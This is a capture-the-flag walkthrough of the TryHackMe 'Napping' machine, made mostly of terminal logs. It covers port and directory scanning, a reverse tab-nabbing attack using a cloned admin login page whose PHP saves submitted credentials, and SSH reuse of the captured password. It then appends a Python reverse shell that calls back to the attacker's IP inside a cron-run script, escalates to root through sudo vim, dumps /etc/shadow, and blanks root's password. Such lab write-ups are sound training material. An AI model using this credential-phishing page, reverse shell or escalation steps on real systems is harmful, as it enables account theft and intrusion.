---
Even Admins can fall asleep on the job
---

![](https://i.postimg.cc/zXXYKx02/Webp-net-resizeimage.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/16af2f72d39c2db1884615f93bd21216.png)

### Napping Flags

 Start Machine

To hack into this machine, you must look at the source and focus on the target.  

Answer the questions below

```
                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.196.198 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.196.198:22
Open 10.10.196.198:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-10 11:58 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:58, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:58
Completed Parallel DNS resolution of 1 host. at 11:58, 0.02s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:58
Scanning 10.10.196.198 [2 ports]
Discovered open port 22/tcp on 10.10.196.198
Discovered open port 80/tcp on 10.10.196.198
Completed Connect Scan at 11:58, 0.19s elapsed (2 total ports)
Initiating Service scan at 11:58
Scanning 2 services on 10.10.196.198
Completed Service scan at 11:58, 6.39s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.196.198.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:58
Completed NSE at 11:59, 5.65s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:59
Completed NSE at 11:59, 0.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:59
Completed NSE at 11:59, 0.00s elapsed
Nmap scan report for 10.10.196.198
Host is up, received user-set (0.19s latency).
Scanned at 2023-01-10 11:58:47 EST for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 85f3f5b48c241eef6f2842337c2a22b4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmgxcZKHEVEbLHxkmo/bjXYP9qMuWYGmbV0Tl/maOUcfyhPcPPcl2S/RzgKgfWR5MBUit4/iD+LBbKvIqv5NsXAMjUFaC35mXLRrEhUXSP4pfcaWGzKARRJ4C9eUHJ1aT/vhU0ZNnhOW1H8Ig+btzcIqeiQJiKH+iGySyTsXJ3qLOAcQ4qwGKfdpnPtN3MYG7Ba6etdN4J+FVm/tjcUxE76ZKv5IdN+iOeTwBhKhk8lTPf6G8S7X2jx38deqAI6j20UBAnlFdfSjVrbavfzoeyAKODpzmgQ0J/VFWIZGqqMxg/Hq6KChT67DTMxrnfN7wojS2/fItjIpsvjTxlxhiHSvi+57ngJlPYKbiqU4P1nbxSB+eyy0UK44ln6MbLpCcRkvwOP87VOvfII4TfXostq94fYRW8G7oszKGFrucQdYoVTFhKgYveKe0np4eGG/GdPefDbLp5VoNTjs7WBDSxn5jY+0A/IY1/EjuaGlQvpk5IxDbU/mYm9bPeSYdAWgk=
|   256 c27ba90c287cd1cd0323f4a8bc02724b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBP4j+pg12EElUiOMAVpEuqFCympfDuyyZ7McBGxU9lCp4qMOGKShc96y4656MSnAZu7ofMx9DyO1sDwcfbI3MQ=
|   256 fe9200b4ee5e5a9252909f5e0bfd61a3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ0X6D1WGTnXedsm4aFXKIEt6iY22msqmq2QvKPW3VXM
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:59
Completed NSE at 11:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:59
Completed NSE at 11:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:59
Completed NSE at 11:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.94 seconds

http://10.10.196.198/ (login)

http://10.10.196.198/register.php (sign up)

http://10.10.196.198/welcome.php (after registering)

Hello, witty! Welcome to our free blog promotions site.
Please submit your link so that we can get started.
All links will be reviewed by our admin who also built this site!

after putting a link like 

<p>Thank you for your submission, you have entered: <a href='https://anon.to/ExGbFK' target='_blank' >Here</a></p>    </form> 

https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.196.198/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k -x txt,php,py,html
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.196.198/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php,py,html,txt
[+] Timeout:                 10s
===============================================================
2023/01/10 12:09:04 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 1211]
/.html                (Status: 403) [Size: 278]
/register.php         (Status: 200) [Size: 1567]
/welcome.php          (Status: 302) [Size: 0] [--> index.php]
/admin                (Status: 301) [Size: 314] [--> http://10.10.196.198/admin/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 1]
Progress: 20364 / 1102805 (1.85%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/01/10 12:10:14 Finished
===============================================================

Forbidden

You don't have permission to access this resource.

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.196.198/admin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k -x txt,php,py,html
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.196.198/admin/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              txt,php,py,html
[+] Timeout:                 10s
===============================================================
2023/01/10 12:11:05 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/login.php            (Status: 200) [Size: 1158]
/welcome.php          (Status: 302) [Size: 0] [--> login.php]
Progress: 5991 / 1102805 (0.54%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/01/10 12:11:28 Finished
===============================================================

http://10.10.196.198/admin/login.php

view-source:http://10.10.196.198/admin/login.php

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Admin Login</h2>
        <p>Please fill in your credentials to login.</p>


        <form action="/admin/login.php" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control " value="">
                <span class="invalid-feedback"></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <br>
        </form>
    </div>
</body>
</html>

We don't have the admin credentials but since we know the admin built the site, we can assume that he has built the same vulnerability on the admin page and that he will be clicking on that link as well. If we can trick the admin into thinking that he got logged out then he will input his credentials again, but this time it will be on our page.

┌──(kali㉿kali)-[~/nappy]
└─$ nano index.php

┌──(kali㉿kali)-[~/nappy]
└─$ cat index.php

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<?php
        if (isset($_POST['username'])){
                file_put_contents('admin.txt', file_get_contents('php://input'));
        }
?>

<body>
    <div class="wrapper">
        <h2>Admin Login</h2>
        <p>Please fill in your credentials to login.</p>


        <form action="/admin/login.php" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control " value="">
                <span class="invalid-feedback"></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <br>
        </form>
    </div>
</body>
</html>

Este código PHP se utiliza para recibir información enviada a través de un formulario web utilizando el método POST, y luego almacena esa información en un archivo llamado "admin.txt" en el servidor.

La función `isset()` se utiliza para comprobar si la variable $_POST['username'] existe, es decir si es enviado por el formulario, si es asi entra al if.

La función `file_get_contents('php://input')` se utiliza para leer el contenido del cuerpo de la solicitud HTTP enviada al servidor. En este caso, se utiliza para leer los datos enviados a través del formulario.

La función `file_put_contents()` se utiliza para escribir un archivo. En este caso, escribe el contenido de la solicitud HTTP en el archivo "admin.txt".

Sin embargo, se debe tener en cuenta que este código no es seguro ya que almacena información sensibles y no tiene ninguna validación. Además, se recomienda usar una mejor manera de almacenar contraseñas o información sensible como usar una base de datos o almacenar las contraseñas hasheadas

┌──(kali㉿kali)-[~/nappy]
└─$ nano blog.html 
                                                                                                                                          
┌──(kali㉿kali)-[~/nappy]
└─$ cat blog.html 
<!DOCTYPE html>
<html>
 <body>
  <script>
  window.opener.location = "http://10.8.19.103:8000/index.php";
  </script>
 </body>
</html>
               
                                                                                                         
┌──(kali㉿kali)-[~/nappy]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(kali㉿kali)-[~/nappy]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

upload link (http://10.8.19.103:8000/blog.html)
and follow link

or using wireshark (to capture admin credentials)

┌──(kali㉿kali)-[~/nappy]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.19.103 - - [10/Jan/2023 13:41:57] "GET /blog.html HTTP/1.1" 304 -
10.10.196.198 - - [10/Jan/2023 13:42:02] "GET /blog.html HTTP/1.1" 200 -
10.10.196.198 - - [10/Jan/2023 13:42:03] "GET /index.php HTTP/1.1" 200 -
10.10.196.198 - - [10/Jan/2023 13:42:03] code 501, message Unsupported method ('POST')

follow tcp (wireshark)

username=daniel&password=C%40ughtm3napping123HTTP/1.0 501 Unsupported method ('POST')

now using php to get admin credentials and save it to admin.txt

┌──(kali㉿kali)-[~/nappy]
└─$ php -S 10.8.19.103:8000    
[Tue Jan 10 13:48:04 2023] PHP 8.1.12 Development Server (http://10.8.19.103:8000) started
[Tue Jan 10 13:48:49 2023] 10.8.19.103:39746 Accepted
[Tue Jan 10 13:48:49 2023] 10.8.19.103:39746 [200]: GET /blog.html
[Tue Jan 10 13:48:49 2023] 10.8.19.103:39746 Closing
[Tue Jan 10 13:49:02 2023] 10.10.196.198:45606 Accepted
[Tue Jan 10 13:49:02 2023] 10.10.196.198:45606 [200]: GET /blog.html
[Tue Jan 10 13:49:02 2023] 10.10.196.198:45606 Closing
[Tue Jan 10 13:49:03 2023] 10.10.196.198:45608 Accepted
[Tue Jan 10 13:49:03 2023] 10.10.196.198:45608 [200]: GET /index.php
[Tue Jan 10 13:49:03 2023] 10.10.196.198:45608 Closing
[Tue Jan 10 13:49:03 2023] 10.10.196.198:45610 Accepted
[Tue Jan 10 13:49:03 2023] 10.10.196.198:45610 [200]: POST /index.php
[Tue Jan 10 13:49:03 2023] 10.10.196.198:45610 Closing
[Tue Jan 10 13:49:03 2023] 10.10.196.198:45612 Accepted
[Tue Jan 10 13:49:03 2023] 10.10.196.198:45612 [200]: GET /blog.html
[Tue Jan 10 13:49:03 2023] 10.10.196.198:45612 Closing
[Tue Jan 10 13:49:04 2023] 10.10.196.198:45614 Accepted
[Tue Jan 10 13:49:04 2023] 10.10.196.198:45614 [200]: GET /index.php
[Tue Jan 10 13:49:04 2023] 10.10.196.198:45614 Closing
[Tue Jan 10 13:49:04 2023] 10.10.196.198:45616 Accepted
[Tue Jan 10 13:49:04 2023] 10.10.196.198:45616 [200]: POST /index.php
[Tue Jan 10 13:49:04 2023] 10.10.196.198:45616 Closing
[Tue Jan 10 13:49:05 2023] 10.10.196.198:45618 Accepted
[Tue Jan 10 13:49:05 2023] 10.10.196.198:45618 [200]: GET /blog.html
[Tue Jan 10 13:49:05 2023] 10.10.196.198:45618 Closing
[Tue Jan 10 13:49:05 2023] 10.10.196.198:45620 Accepted
[Tue Jan 10 13:49:05 2023] 10.10.196.198:45620 [200]: GET /index.php
[Tue Jan 10 13:49:05 2023] 10.10.196.198:45620 Closing
[Tue Jan 10 13:49:05 2023] 10.10.196.198:45622 Accepted
[Tue Jan 10 13:49:05 2023] 10.10.196.198:45622 [200]: POST /index.php
[Tue Jan 10 13:49:05 2023] 10.10.196.198:45622 Closing
[Tue Jan 10 13:49:06 2023] 10.10.196.198:45624 Accepted
[Tue Jan 10 13:49:06 2023] 10.10.196.198:45624 [200]: GET /blog.html
[Tue Jan 10 13:49:06 2023] 10.10.196.198:45624 Closing
[Tue Jan 10 13:49:06 2023] 10.10.196.198:45626 Accepted
[Tue Jan 10 13:49:06 2023] 10.10.196.198:45626 [200]: GET /index.php
[Tue Jan 10 13:49:06 2023] 10.10.196.198:45626 Closing
[Tue Jan 10 13:49:07 2023] 10.10.196.198:45628 Accepted
[Tue Jan 10 13:49:07 2023] 10.10.196.198:45628 [200]: POST /index.php
[Tue Jan 10 13:49:07 2023] 10.10.196.198:45628 Closing

┌──(kali㉿kali)-[~/nappy]
└─$ php -S 10.8.19.103:80    
[Tue Jan 10 13:48:19 2023] PHP 8.1.12 Development Server (http://10.8.19.103:80) started

┌──(kali㉿kali)-[~/nappy]
└─$ ls
admin.txt  blog.html  index.php
                                                                                                                                          
┌──(kali㉿kali)-[~/nappy]
└─$ cat admin.txt
username=daniel&password=C%40ughtm3napping123    

C%40ughtm3napping123 (cyberchef url decode)

daniel:C@ughtm3napping123

http://10.10.196.198/admin/welcome.php (login)
Welcome back daniel

maybe using ssh

Reussing password

It is easy to see why it is important to avoid reusing the same username password pairs on different platforms.

horizontal escalation:
┌──(kali㉿kali)-[~/nappy]
└─$ ssh daniel@10.10.196.198 
The authenticity of host '10.10.196.198 (10.10.196.198)' can't be established.
ED25519 key fingerprint is SHA256:JofRko6/RC6xnBRFyh6aSMX+ospLetfcod6d05kXQQU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.196.198' (ED25519) to the list of known hosts.
daniel@10.10.196.198's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 10 Jan 2023 06:55:36 PM UTC

  System load:  0.0               Processes:             117
  Usage of /:   56.2% of 8.90GB   Users logged in:       0
  Memory usage: 60%               IPv4 address for eth0: 10.10.196.198
  Swap usage:   0%


10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Mar 16 00:41:48 2022 from 10.0.2.26
daniel@napping:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)

daniel@napping:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root             84K Jul 14  2021 /snap/core20/1328/usr/bin/chfn
-rwsr-xr-x 1 root   root             52K Jul 14  2021 /snap/core20/1328/usr/bin/chsh
-rwsr-xr-x 1 root   root             87K Jul 14  2021 /snap/core20/1328/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             55K Jul 21  2020 /snap/core20/1328/usr/bin/mount
-rwsr-xr-x 1 root   root             44K Jul 14  2021 /snap/core20/1328/usr/bin/newgrp
-rwsr-xr-x 1 root   root             67K Jul 14  2021 /snap/core20/1328/usr/bin/passwd
-rwsr-xr-x 1 root   root             67K Jul 21  2020 /snap/core20/1328/usr/bin/su
-rwsr-xr-x 1 root   root            163K Jan 19  2021 /snap/core20/1328/usr/bin/sudo
-rwsr-xr-x 1 root   root             39K Jul 21  2020 /snap/core20/1328/usr/bin/umount
-rwsr-xr-- 1 root   systemd-resolve  51K Jun 11  2020 /snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            463K Dec  2  2021 /snap/core20/1328/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            121K Feb 15  2022 /snap/snapd/14978/usr/lib/snapd/snap-confine
-rwsr-sr-x 1 daemon daemon           55K Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root   root             84K Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root   root             52K Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root   root             39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root   root             87K Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             55K Feb  7  2022 /usr/bin/mount
-rwsr-xr-x 1 root   root             44K Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root   root             67K Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root   root             31K Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root   root             67K Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root   root            163K Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root   root             39K Feb  7  2022 /usr/bin/umount
-rwsr-xr-- 1 root   messagebus       51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root            463K Dec  2  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root            140K Feb 23  2022 /usr/lib/snapd/snap-confine

daniel@napping:~$ groups
daniel administrators
daniel@napping:~$ find / -group administrators -type f 2>/dev/null
/home/adrian/query.py
daniel@napping:~$ cat /home/adrian/query.py
from datetime import datetime
import requests

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()


daniel@napping:/home/adrian$ ls
query.py  site_status.txt  user.txt
daniel@napping:/home/adrian$ cat site_status.txt 
Site is Up: 10/01/2023 19:00:05
Site is Up: 10/01/2023 19:01:02
daniel@napping:/home/adrian$ cat user.txt 
cat: user.txt: Permission denied

daniel@napping:/home/adrian$ ls -lah
total 44K
drwxr-xr-x 4 adrian adrian         4.0K Jan 10 19:00 .
drwxr-xr-x 4 root   root           4.0K Mar 15  2022 ..
lrwxrwxrwx 1 root   root              9 Mar 16  2022 .bash_history -> /dev/null
-rw-r--r-- 1 adrian adrian          220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 adrian adrian         3.7K Feb 25  2020 .bashrc
drwx------ 2 adrian adrian         4.0K Mar 15  2022 .cache
lrwxrwxrwx 1 root   root              9 Mar 16  2022 .mysql_history -> /dev/null
-rw-r--r-- 1 adrian adrian          807 Feb 25  2020 .profile
-rw-rw-r-- 1 adrian administrators  480 Mar 16  2022 query.py
-rw-rw-r-- 1 adrian adrian           75 Mar 16  2022 .selected_editor
-rw-rw-r-- 1 adrian adrian           96 Jan 10 19:02 site_status.txt
drwx------ 2 adrian adrian         4.0K Mar 15  2022 .ssh
-rw-r--r-- 1 adrian adrian            0 Mar 15  2022 .sudo_as_admin_successful
-rw-r----- 1 root   adrian           56 Mar 16  2022 user.txt
-rw------- 1 adrian adrian            0 Mar 16  2022 .viminfo

daniel@napping:/home/adrian$ which python
daniel@napping:/home/adrian$ which python3
/usr/bin/python3

https://www.revshells.com/ (0day)

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

so adding to query.py

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

daniel@napping:/home/adrian$ nano query.py 
daniel@napping:/home/adrian$ cat query.py 
from datetime import datetime
import requests

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

┌──(kali㉿kali)-[~/nappy]
└─$ rlwrap nc -lnvp 4444                                      
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.196.198.
Ncat: Connection from 10.10.196.198:55984.
adrian@napping:~$ whoami
whoami
adrian
adrian@napping:~$ ls
ls
query.py  site_status.txt  user.txt
adrian@napping:~$ cat user.txt
cat user.txt
THM{Wh@T_1S_Tab_NAbbiN6_&_PrinCIPl3_of_L3A$t_PriViL36E}


vertical escalation:

adrian@napping:~$ sudo -l
sudo -l
Matching Defaults entries for adrian on napping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on napping:
    (root) NOPASSWD: /usr/bin/vim

https://gtfobins.github.io/gtfobins/vim/


sudo vim -c ':!/bin/sh'


adrian@napping:~$ sudo vim -c ':!/bin/sh'
sudo vim -c ':!/bin/sh'

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_amiga
    builtin_beos-ansi
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to 'ansi'

# cat /root/root.txt
cat /root/root.txt
THM{Adm1n$_jU$t_c@n'T_stAy_Aw@k3_T$k_tsk_tSK}
# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
adrian:x:1000:1000:adrian:/home/adrian:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
daniel:x:1001:1001::/home/daniel:/bin/bash
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
# cat /etc/shadow
cat /etc/shadow
root:$6$3UECX9wT715oxcnt$msT.36.MBrtkTJE/KWy0PE7WeVlds9RSJzMaI3iV.0bSW8mNoplzZ/pJoi4U13Ll8UOThPmea.alMu4nxou8z/:19066:0:99999:7:::
daemon:*:19046:0:99999:7:::
bin:*:19046:0:99999:7:::
sys:*:19046:0:99999:7:::
sync:*:19046:0:99999:7:::
games:*:19046:0:99999:7:::
man:*:19046:0:99999:7:::
lp:*:19046:0:99999:7:::
mail:*:19046:0:99999:7:::
news:*:19046:0:99999:7:::
uucp:*:19046:0:99999:7:::
proxy:*:19046:0:99999:7:::
www-data:*:19046:0:99999:7:::
backup:*:19046:0:99999:7:::
list:*:19046:0:99999:7:::
irc:*:19046:0:99999:7:::
gnats:*:19046:0:99999:7:::
nobody:*:19046:0:99999:7:::
systemd-network:*:19046:0:99999:7:::
systemd-resolve:*:19046:0:99999:7:::
systemd-timesync:*:19046:0:99999:7:::
messagebus:*:19046:0:99999:7:::
syslog:*:19046:0:99999:7:::
_apt:*:19046:0:99999:7:::
tss:*:19046:0:99999:7:::
uuidd:*:19046:0:99999:7:::
tcpdump:*:19046:0:99999:7:::
landscape:*:19046:0:99999:7:::
pollinate:*:19046:0:99999:7:::
usbmux:*:19066:0:99999:7:::
sshd:*:19066:0:99999:7:::
systemd-coredump:!!:19066::::::
adrian:$6$RovAX7SMXd1hX//A$mqy7H.f..1GTNX7ktOIktt7YLsWdMW1M/P8Mq7qTr96pXmTsu.7nDC0vL3NJeR5rmfkAYKODOULrWkp3gUFrT0:19066:0:99999:7:::
lxd:!:19066::::::
daniel:$6$q0fOvN71FGjxAsfj$qla3bdjghSYjEXD4lB9cFyY5doWUSA4sIKgZnBXB1pJB3p8G9g5pXGw5fQsI1yR7pyfFR5V2DXYTAhYN8pC.G0:19066:0:99999:7:::
mysql:!:19066:0:99999:7:::

Removing with vim also can do it

from

root:x:0:0:root:/root:/bin/bash

to

root::0:0:root:/root:/bin/bash

like this:

adrian@napping:~$ sudo /usr/bin/vim /etc/passwd

adrian@napping:/var/www/html$ ls
ls
admin       index.php   register.php        welcome.php
config.php  logout.php  reset-password.php
adrian@napping:/var/www/html$ cat config.php
cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
